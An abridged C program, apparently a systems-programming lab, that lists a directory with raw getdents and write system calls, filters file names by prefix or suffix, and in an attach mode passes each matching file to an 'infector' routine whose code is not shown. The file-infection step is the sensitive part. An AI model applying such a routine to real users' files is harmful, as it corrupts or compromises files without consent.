...
/*print the system call int value and the return value*/
...
void printFile(int output, linux_dirent* file, int debug, int prefixMode, int attachMode, char type){
	int check = system_call(SYS_WRITE, output, file->name, strlen(file->name));
	system_call(SYS_WRITE, output, "\t\t", 2);
	int check2 = system_call(SYS_WRITE, output, getType(type), strlen(getType(type)));
	if(attachMode)
		infector(file->name);
...
int main (int argc , char* argv[], char* envp[]){
	...
	for(i = 1; i < argc; i++){
		if((strcmp("-D", argv[i]) == 0))
			...
			suffixMode = 1;
			suffix = (argv[i] + 2);
			system_call(SYS_WRITE, output, suffix, strlen(suffix));
			system_call(SYS_WRITE, output, "\n", 1);
		}
	...
	if(dirLen < 0){
		errorHandler(output, "getdents system call error\n");
	}
	...
	while(i < dirLen){
		...
		if(prefixMode || attachMode || suffixMode){
			if (suffixMode && (prefixMode || attachMode)){
				numOfNexts = strlen(file->name) - strlen(suffix);
				suffixName = (char*)file->name + numOfNexts;
				if (strncmp(prefix, file->name, strlen(prefix)) == 0){
					if (strncmp(suffix, suffixName, strlen(suffix)) == 0){
						printFile(output, file, debug, prefixMode, attachMode, type);
					}
				}
			}
			else{
				if (suffixMode){
					...
					suffixName = (char*)file->name + numOfNexts;
					if (strncmp(suffix, suffixName, strlen(suffix)) == 0){
						printFile(output, file, debug, suffixMode, attachMode, type);
					}
				}
				else{
					if (strncmp(prefix, file->name, strlen(prefix)) == 0){
    		...
    		else if(!prefixMode && !attachMode && !suffixMode)
			printFile(output, file, debug, prefixMode, attachMode, type);
		i = i + file->len;
	}
	return 0;
